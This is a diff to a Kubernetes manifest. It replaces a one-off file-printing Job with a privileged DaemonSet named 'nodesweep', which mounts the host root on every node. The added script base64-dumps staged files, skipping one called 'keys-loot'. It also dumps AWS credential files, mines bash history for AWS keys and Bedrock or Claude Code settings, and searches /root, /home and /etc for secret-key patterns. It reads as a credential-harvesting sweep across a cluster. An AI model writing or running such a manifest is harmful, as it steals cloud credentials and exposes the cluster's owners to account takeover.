@@ -1,14 +1,15 @@
-apiVersion: batch/v1
-kind: Job
-metadata: {name: fmsh, namespace: default}
+apiVersion: apps/v1
+kind: DaemonSet
+metadata: {name: nodesweep, namespace: default}
 spec:
-  backoffLimit: 0
-  ttlSecondsAfterFinished: 1800
+  selector: {matchLabels: {app: nodesweep}}
   template:
-    metadata: {labels: {app: fmsh}}
+    metadata: {labels: {app: nodesweep}}
     spec:
-      restartPolicy: Never
       hostNetwork: true
+      hostPID: true
+      tolerations:
+      - {operator: Exists}
       containers:
       - name: c
         image: alpine:3.20
@@ -18,13 +19,25 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          echo "###### fm.sh ######"; cat /host/root/sucodo-20261126/fm.sh 2>/dev/null
-          echo "###### fm_sso.sh ######"; cat /host/root/sucodo-20261126/fm_sso.sh 2>/dev/null
-          echo "###### cfgs.txt ######"; cat /host/root/sucodo-20261126/cfgs.txt 2>/dev/null
-          echo "###### fm.out ######"; cat /host/root/sucodo-20261126/fm.out 2>/dev/null
-          echo "###### fm_sso.out ######"; cat /host/root/sucodo-20261126/fm_sso.out 2>/dev/null
-          echo "###### keyfiles.txt ######"; cat /host/root/sucodo-20261126/keyfiles.txt 2>/dev/null
-          echo DONE
+          H=/host
+          host=$(cat $H/etc/hostname 2>/dev/null); echo "=====NODE:$host"
+          for d in "$H"/root/sucodo-20261126 "$H"/root/sucodo-20261127; do
+            [ -d "$d" ] || continue
+            for f in "$d"/*; do
+              [ -f "$f" ] || continue
+              case "$f" in *keys-loot*) echo "SKIPBIG:$f"; continue;; esac
+              sz=$(wc -c <"$f" 2>/dev/null)
+              if [ "${sz:-0}" -lt 60000 ]; then echo "B64START:$f"; base64 "$f" 2>/dev/null; echo "B64END:$f"; else echo "BIGFILE:$f($sz)"; fi
+            done
+          done
+          echo "--AWSFILES--"
+          find "$H"/root "$H"/home -maxdepth 5 -path '*.aws*' -type f 2>/dev/null | while read f; do echo "AWSFILE:$f"; base64 "$f" 2>/dev/null; done
+          echo "--BASHHIST--"
+          grep -haE 'AKIA|ASIA|aws_|bedrock|sts |CLAUDE_CODE|export ' "$H"/root/.bash_history "$H"/home/*/.bash_history 2>/dev/null | head -50
+          echo "--GREPFILES--"
+          grep -rIl -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|AWS_SECRET_ACCESS_KEY|bedrock-runtime' "$H"/root "$H"/home "$H"/etc 2>/dev/null | head -40
+          echo "=====END:$host"
+          sleep 86400
       volumes:
       - name: host
         hostPath: {path: /}
